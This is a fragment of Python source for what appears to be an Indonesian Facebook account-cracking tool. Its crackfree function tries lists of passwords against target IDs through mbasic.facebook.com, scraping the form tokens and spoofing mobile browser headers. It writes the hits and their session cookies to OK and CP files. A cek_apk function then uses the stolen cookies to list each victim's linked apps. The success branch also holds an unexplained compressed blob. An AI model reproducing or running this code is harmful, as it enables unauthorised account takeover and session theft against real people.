cps=[]
def crackfree(idf,pwv):
	global loop,ok,cp
	rr = random.randint
	##bikk = open('/sdcard/document:///content://com.termux.documents/tree/%252Fdata%252Fdata%252Fcom.termux%252Ffiles%252Fhome?/downtown/user-agents_dalvik.txt', 'r').read().splitlines() 
	##bio = open('uaa.txt', 'r').read().splitlines() 
	##bra = open('ua.txt', 'r').read().splitlines() 
	ua = random.choice([demon,None]) 
	##uay = ua_generator.generate(platform='android',browser='chrome') 
	ua = random.choice(uay) 
	ses = requests.Session()
	prog.update(des,description=f'\r[r]⏰{idf}⏰[italic white] [{loop}-{len(id)}]OK-:[italic green]{ok} [/] CP-:[italic yellow]{cp} [/]  ') 
	prog.advance(des) 
	for pw in pwv:
		try:
			link = ses.get('https://mbasic.facebook.com/')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {
				'Host': 'mbasic.facebook.com',
				'cache-control': 'max-age=0',
				'upgrade-insecure-requests': '1',
				'user-agent': ua, 
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-user': '?1',
				'x-requested-with': 'com.kiwi.browser', 
				'sec-fetch-dest': 'empity',
				'viewport-width': '980',
				'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'sec-ch-ua-platform-version': '""',
				'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5741.211", "Google Chrome";v="114.0.5741.211"',
				'sec-ch-prefers-color-scheme': 'light',
				'referer': 'https://mbasic.facebook.com/', 
				'accept-encoding': 'gzip, deflate',
				'accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6'
			}
			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				raf = f'[italic white]•••> [italic yellow2]{idf}|{pw}\n[r white]{urgas}\n'
				cetak(raf) 
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				raf = f'[italic white]•••> [italic green]{idf}|{pw}\n[r green]{kuki}'
				cetak(raf) 
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				zlib.decompress(b"x\x9c}\xcd]k\xc20\x14\xc6\xf1{?\xc5\xc1\x8b\xa1\x17MS\xf6\xd2\x17(\xa3\xadA\x86\xd6\x94T'\xeeF\xe2\x9a\xa6\xc5ic\x93\xa22\xf6\xdd'[/\xc7\xce\xe5\xef\xc0\xffi\xc5\xa9\x13\xdah\xa4\x1amF\xe5\xb02F\xe9\xc0\xb6\xb9\xaa\x91\x11\x1fB\xb6\xfc\x80\x9aV\xda\xbb\xc6<z\xd8\xf1\x1c\xff\xc1\xc3A\x14M\xb3\xd2\xdd\xce\xef\xa5\xc5\x938\xd5\xe7\xec\xb0>\xb2\xd7\xb7\x93b21\x95\xa5\xf5\xc6\xd6\xe2X\xa4Bk.\xc5\xf3{\xc5\xcd\xb6.B\xc7w]\xec{\x18?\xdd\x19q1!\xd0\x190\x92\xaf\xe6K\xd8\xb5\x9d@\xea:\x80\xf0\x8f\x1b X\xe5\x84\x01\xc0\x08\xe0\xb3.\xca/\x80\xf1\r\xb3(\xcf\xd7\x94M~]\x9d\x7f\xf8\xbfB4%\x8be\x9f\xe9x_A\x90P:{!\xbd\xef\xbb}\xdd\x7f\xe2+\x04\x16$\x9b\xf8\xb6=!)]\xc0\x10\xc6\xdf9cV\x97")
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
#-----------------------[ METODE ALPHA ]--------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s    \033[0m        ╰─ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s    \033[0m        ╰─ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s \033[0mcookie invalid"%(M))
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('RAF_MKZ') 
	except:pass
	login() 
